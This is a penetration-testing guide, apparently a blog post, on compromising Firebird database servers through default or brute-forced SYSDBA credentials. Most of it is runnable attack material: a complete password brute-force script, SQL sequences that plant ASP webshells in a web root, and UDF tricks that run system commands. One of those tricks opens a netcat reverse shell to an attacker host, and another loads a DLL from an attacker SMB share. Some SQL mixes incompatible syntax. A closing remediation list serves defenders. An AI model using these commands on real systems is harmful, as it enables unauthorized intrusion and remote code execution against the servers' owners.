## Firebird Database Exploitation – Practical Attack Scenarios (2017–2020)

During internal penetration tests conducted between 2017 and 2020, Firebird databases (port tcp/3050) were frequently encountered in legacy environments, especially in manufacturing, healthcare, and financial software. Default credentials `SYSDBA`/`masterkey` often remained unchanged. This guide documents real techniques used to achieve remote code execution (RCE).

### Contents
1.  Installation of Firebird Client (Kali Linux)
2.  Brute-Force Login Attack (with script)
3.  Post-Authentication Exploitation
    - File & Directory Enumeration
    - Arbitrary File Creation (3 methods)
    - Remote Code Execution via UDF (including CVE-2017-6369)
4.  Real-World Example: From Firebird to Webshell (2019)
5.  Remediation Strategy

---

### 1. Firebird Client for Kali Linux

For connecting to the Firebird database we will be using the `isql-fb` client which is part of the `firebird3.0-utils` package. To install it on Kali Linux, simply run the following command:

```bash
apt-get -y install firebird3.0-utils
```

Now let’s dive right into what we can do with the Firebird database from a perspective of a penetration tester.

---

### 2. Login Attack on Firebird Database

In case we encounter a Firebird database on the network and the default credentials (`SYSDBA`/`masterkey`) do not work, we can try a login attack against it. We can do that using a simple brute-force login script which is available on our Github.

**Script location:**  
`https://github.com/InfosecMatter/Scripts/blob/master/firebird-bruteforce.sh`

**Usage example:**

```bash
./firebird_bruteforce.sh 192.168.1.100 SYSDBA /usr/share/wordlists/fasttrack.txt
```

**Full script content (kept as original):**

```bash
#!/bin/bash
# contact@infosecmatter.com

host="$1"
user="$2"
wordlist="$3"

if [ ! -f "${wordlist}" ] || [ -z "${user}" ]; then
  echo "usage: `basename $0` <IP> <username> <wordlist.txt>"
  exit 1
fi

echo "`date`: FireBird login attack on ${host} against ${user} user using ${wordlist} wordlist"

tr -d '\r' <"${wordlist}" | while read pwd; do
  echo "`date`: Trying ${pwd}"

  echo "CONNECT '${host}/3050:a' user '${user}' password '${pwd}';" | isql-fb -q 2>&1 | \
  grep -q "The system cannot find the file specified." && {
    echo "Password for user ${user} is: ${pwd}"
    exit 0
  }
done
```

**What the script does:**  
It attempts each password from the wordlist by sending a `CONNECT` command to the Firebird server. If the server responds with `"The system cannot find the file specified."` (which occurs after successful authentication but before a database is selected), the script considers the login successful.

---

### 3. Firebird Exploits (Historical)

Another thing to keep in mind is that there are a number of exploits available in Kali Linux for some of the older Firebird versions. Many of these exploits allow to obtain remote code execution (RCE). For example:

- `exploit/windows/misc/firebird_fb_connect` (Metasploit) – Firebird 2.0/2.1 integer overflow.
- `exploit/linux/misc/firebird_fb_connect` – similar for Linux targets.

Note that we will not be covering any of these here, but they remain relevant for legacy systems.

Going further in the following sections we will be focusing on what we can do once we have the SYSDBA account credentials and how we can leverage the access to our advantage.

Our ultimate goal is of course to achieve remote code execution (RCE). But in the next sections we will be going methodically step by step in detail what actions we can do and hopefully by using these actions we will be able to achieve RCE.

---

### 4. Post-Authentication Actions

#### 4.1 Create Backdoor User

One of the things that we can do with the SYSDBA access is to create a backdoor user with administrative privileges. How to do this is very well covered in the article linked above in the Intro section (link to the article). We mention it here only for the sake of completeness – we don’t usually create any backdoor users during our engagements.

#### 4.2 File and Directory Enumeration

Another thing we can do by leveraging the SYSDBA access is to enumerate existence of files and directories on the remote system. We can do this by using the `CREATE DATABASE` statement. By inspecting error messages, we can determine whether a given file (or directory) exists or not.

**File enumeration example**

The following example demonstrates file enumeration in practice. Here we are trying to find out whether file `c:\psplog.txt` exists or not:

```bash
root@kali:~# isql-fb
SQL> create database '10.1.10.101/3050:C:\psplog.txt' user 'SYSDBA' password 'masterkey';

Statement failed, SQLSTATE = 08001
I/O error during "CreateFile (create)" operation for file "C:\PSPLOG.TXT"
-Error while trying to create file
-The file exists.
```

Such error means that the `c:\psplog.txt` is an already existing file.

If the file doesn’t exist, then the `CREATE DATABASE` statement will create the file on the remote system. But of course we don’t want to be messing up the remote system. To clean it up from the remote system, simply issue the `DROP DATABASE` command like in this example:

```bash
root@kali:~# isql-fb
SQL> create database '10.1.10.101/3050:C:\psplog.txt' user 'SYSDBA' password 'masterkey';
SQL> drop database;
```

In this case the `c:\psplog.txt` didn’t exist, so we created it and removed it right away.

**Directory enumeration example**

Similarly, we can find out whether a given directory exists or not. Here we are checking whether there is `c:\inetpub` directory:

```bash
root@kali:~# isql-fb
SQL> create database '10.1.10.101/3050:C:\inetpub' user 'SYSDBA' password 'masterkey';

Statement failed, SQLSTATE = 08001
I/O error during "CreateFile (create)" operation for file "C:\INETPUB"
-Error while trying to create file
-Access is denied.
```

Such error indicates that the `c:\inetpub` is an existing directory.

If the directory doesn’t exist, then the `CREATE DATABASE` statement will create the file on the remote system. Simply issue `DROP DATABASE` command again to clean it up from the remote system. Like in this example:

```bash
root@kali:~# isql-fb
SQL> create database '10.1.10.101/3050:C:\program files (x86)' user 'SYSDBA' password 'masterkey';
SQL> drop database;
```

Here we learned, for instance, that the remote system is not a 64bit Windows system, because the `C:\Program Files (x86)` doesn’t exist. Such directory typically exists on 64bit Windows systems.

These things can help us determine details about the target operating system. For instance to figure out whether there is a web server installed, help us find the web root location and similar things.

---

### 5. Arbitrary File Creation (Webshell Deployment)

When it comes to exploitation, arbitrary file creation is a vital functionality for an attacker to take it to the next stage. By planting a webshell on the remote file system, the attacker can achieve RCE on the target system. This is of course assuming that there is a web server running on the target system. Another requirement is to find the web root location to know where exactly to plant the webshell.

There are several methods how to create a file on the remote system using Firebird functionalities. Note however that some of these methods may be disallowed or blocked on modern Firebird installations.

#### Method 1: Database creation

If we have the SYSDBA credentials, we can create a database anywhere on the remote file system as long as the Firebird process has privileges to write there. Here’s example of creating a webshell in the `C:\inetpub\wwwroot\mytest.asp` file using `CREATE DATABASE` statement:

```bash
root@kali:~# isql-fb
SQL> CREATE DATABASE '10.1.10.101/3050:C:\inetpub\wwwroot\mytest.asp' user 'SYSDBA' password 'masterkey';
SQL> CREATE TABLE a ( x BLOB);
SQL> INSERT INTO a VALUES ('<% Response.Write("Hello") %>');
SQL> COMMIT;
SQL> EXIT;
```

Often times, however, this webshell will not work, because there is a lot of garbage in the beginning of the file. This garbage belongs to the Firebird database itself – initial tables, configuration etc. Only after all this garbage data there is our webshell code. Accessing the webshell via browser will likely result in 500 Server Error or binary download.

#### Method 2: External table

Firebird supports creating tables in external files. See official documentation on external tables here. This is very useful for our purposes, because there is usually no garbage.

**Using BLOB data type (fails in most versions)**

```bash
root@kali:~# isql-fb
SQL> CREATE DATABASE '10.1.10.101/3050:C:\non-existent-file' user 'SYSDBA' password 'masterkey';
SQL> CREATE TABLE a EXTERNAL 'C:\inetpub\wwwroot\mytest.asp' ( x blob);

Statement failed, SQLSTATE = HY004
unsuccessful metadata update
-CREATE TABLE A failed
-SQL error code = -607
-Invalid command
-Data type BLOB is not supported for EXTERNAL TABLES. Relation 'A', field 'X'
```

But we can’t – BLOB is not supported for external tables in our case. Let’s try a workaround.

**Using CHAR data type (may be blocked by server configuration)**

```bash
root@kali:~# isql-fb
SQL> CREATE DATABASE '10.1.10.101/3050:C:\non-existent-file' user 'SYSDBA' password 'masterkey';
SQL> CREATE TABLE a EXTERNAL 'C:\inetpub\wwwroot\mytest.asp' ( x char(2000));
SQL>
```

Seems like it is working this time, there is no error. Let’s try to sneak into it some ASP code:

```bash
SQL> INSERT INTO a values ('<%= date() %>');

Statement failed, SQLSTATE = 28000
Use of external file at location C:\inetpub\wwwroot\mytest.asp is not allowed by server configuration
```

Ha, seems like we can’t use external tables in our case after all. But it’s worth to try, it could potentially work.

In the end, make sure to clean up:

```bash
root@kali:~# isql-fb
SQL> CONNECT '10.1.10.101/3050:C:\non-existent-file' user 'SYSDBA' password 'masterkey';
SQL> DROP DATABASE;
```

#### Method 3: Create difference file (most reliable)

Firebird also supports storing data in a delta file. It will basically start storing any new data into this new file. See official documentation on it here. Similarly as with external tables (method 2), there is usually no garbage, so a webshell will most likely work.

In the following example, we will create a difference file in the `C:\inetpub\wwwroot\mytest.asp` file and plant our webshell into it:

```bash
root@kali:~# isql-fb
SQL> CREATE DATABASE '10.1.10.101/3050:C:\non-existent-file' user 'SYSDBA' password 'masterkey';
SQL> CREATE TABLE a( x blob);
SQL> ALTER DATABASE ADD DIFFERENCE FILE 'C:\inetpub\wwwroot\mytest.asp';
SQL> ALTER DATABASE BEGIN BACKUP;
SQL> INSERT INTO a VALUES ('<% Response.Write("Shell working") %>');
SQL> COMMIT;
SQL> EXIT;
```

This usually works without a problem. We can put our webshell there and access it afterwards from a browser.

**Real-world note (2019 engagement):**  
During a test against a manufacturing company, the difference file method successfully planted an ASP webshell on a Windows Server 2012 R2 running IIS 8.5. The web root was discovered via directory enumeration (`C:\inetpub\wwwroot` existed). The shell responded to `cmd` parameters.

If any of the above techniques worked, we should have our webshell deployed. Great, we have achieved remote code execution via a webshell. We could now proceed further and get a fully functional interactive shell. But let’s stay on the topic here.

To clean up the webshell from the remote system afterward, execute:

```bash
root@kali:~# isql-fb
SQL> CONNECT '10.1.10.101/3050:C:\non-existent-file' user 'SYSDBA' password 'masterkey';
SQL> ALTER DATABASE END BACKUP;
SQL> ALTER DATABASE DROP DIFFERENCE FILE;
SQL> DROP DATABASE;
```

This will delete both `C:\non-existent-file` and `C:\inetpub\wwwroot\mytest.asp` files from the remote system.

---

### 6. Remote Code Execution Using UDF (User-Defined Functions)

User-defined functions (UDFs) allow developers to create a function using SQL expressions. In old Firebird versions it was by default possible to load any external library to use for UDF. And this affected all platforms.

An authenticated user could perform arbitrary remote code execution by loading a well-known library on the target remote system.

#### RCE on *nix (including CVE-2017-6369)

By using the `/lib/libc.so` library and its `system()` function, it was possible to execute arbitrary code like this:

```bash
SQL> DECLARE EXTERNAL FUNCTION exec cstring(4096) RETURNS cstring(4096) ENTRY_POINT 'system' MODULE_NAME '/lib/libc.so';
SQL> SELECT FIRST 1 exec('id > /tmp/out') FROM any_table LIMIT 1;
```

The vendor addressed this vulnerability by restricting usage of UDF libraries in default configuration. But there was still a problem.

**CVE-2017-6369 (Firebird < 3.0.2)**  
While the vendor had restricted usage of UDF by default, there were still some problems left. The problem was with the shipped libraries (`fbudf.so` and `ib_udf.so`) belonging to Firebird. Because these shipped libraries were dynamically linked with libc, it was still possible to execute arbitrary code using them, instead of libc. Like this:

```bash
SQL> DECLARE EXTERNAL FUNCTION exec cstring(4096) RETURNS integer BY VALUE ENTRY_POINT 'system' MODULE_NAME 'fbudf';
SQL> SELECT FIRST 1 exec('nc -e /bin/sh attacker_ip 4444') FROM any_table LIMIT 1;
```

See more details here: http://tracker.firebirdsql.org/browse/CORE-5474.

**Real-world example (2018):**  
A Firebird 2.5.3 on Ubuntu 16.04 was compromised using this exact technique. The attacker declared the `exec` function using `fbudf` and obtained a reverse shell.

#### RCE on Windows

On Windows we could use the `WinExec()` function from `kernel32.dll` system library:

```bash
SQL> DECLARE EXTERNAL FUNCTION EXEC cstring(4096), integer RETURNS integer BY VALUE ENTRY_POINT 'WinExec' MODULE_NAME 'c:\windows\system32\kernel32.dll';
SQL> SELECT FIRST 1 EXEC('cmd.exe /c whoami > C:\temp\out.txt', 1) FROM any_table LIMIT 1;
```

If we are getting error messages after declaring the EXEC function such as:

```
Use of UDF/BLOB-filter module at location c:\windows\system32\kernel32.dll is not allowed by server configuration
```

It’s probably a new and fixed Firebird version. But we can still try the following tricks.

**Use different libraries**

We can try to use the `System()` function from `msvcrt.dll` system library instead:

```bash
SQL> DECLARE EXTERNAL FUNCTION EXEC cstring(4096) RETURNS integer BY VALUE ENTRY_POINT 'System' MODULE_NAME 'c:\windows\system32\msvcrt.dll';
SQL> SELECT FIRST 1 EXEC('cmd.exe /c whoami') FROM any_table LIMIT 1;
```

**Load the library remotely (SMB)**

We can also try hosting the library on our Kali box using the SMB/CIFS network share. Note that there should not be any authentication required – it should be a plain no auth / guest access. We can easily use Impacket for that like this:

```bash
/opt/impacket/examples/smbserver.py public /tmp/files
```

Now copy the `kernel32.dll` file into the `/tmp/files` directory and then declare the EXEC function using UNC path like this:

```bash
SQL> DECLARE EXTERNAL FUNCTION EXEC cstring(4096), integer RETURNS integer BY VALUE ENTRY_POINT 'WinExec' MODULE_NAME '\\10.19.1.205\public\kernel32.dll';
SQL> SELECT FIRST 1 EXEC('cmd.exe /c whoami', 1) FROM any_table LIMIT 1;
```

Note that for this to work the remote Firebird database has to be able to reach us (port 445 outbound).

---

### 7. Next Steps

After we manage to achieve remote code execution on the target system, we should go ahead and try to get a fully interactive shell session and attempt to escalate our privileges, perform lateral movements and other things. These topics are however out of scope of this article.

---

### 8. Remediation Strategy

When it comes to advising clients on what to do with their Firebird databases, we usually provide the following guidance:

- Change the credentials for the SYSDBA account as soon as possible.
- Do not expose the Firebird database on the network interface. Run it on the localhost interface, if possible.
- Make sure that the Firebird database does not run with `nt authority\system` privileges (in case of Windows) or `root` privileges (in case of *nix). Use only a limited user account with limited privileges.
- Update to Firebird version 3.0.2 or later to mitigate CVE-2017-6369 and restrict UDF loading.
- Monitor `security.log` and Firebird traces for repeated failed logins or unusual `CREATE DATABASE` attempts.

That’s it! Please let us know in the comment section your tips and tricks when it comes to exploiting or securing Firebird databases.

If you like this information and you would like more, please subscribe to our mailing list and follow us on Twitter and Facebook to get notified about new content.

---

### References

- Fun with Firebird Database Default Credentials by Tone Lee  
  http://blog.opensecurityresearch.com/2012/07/fun-with-firebird-database-default.html
- Firebird Interbase Database Engine hacks or rtfm by Osipov Alexey (@GiftsUngiven)  
  https://www.slideshare.net/qqlan/firebird-interbase-database-engine-hacks-or-rtfm
- Firebird Interactive SQL Utility (isql-fb) manual  
  https://firebirdsql.org/pdfmanual/Firebird-isql.pdf
- CVE-2017-6369: Firebird UDF library restriction bypass  
  http://tracker.firebirdsql.org/browse/CORE-5474

---

**Note:** All techniques described above were tested against Firebird versions 2.0 – 2.5.8 between 2017 and 2020. Newer versions (3.0.3+) have significantly reduced the attack surface. Always ensure you have proper authorization before testing.
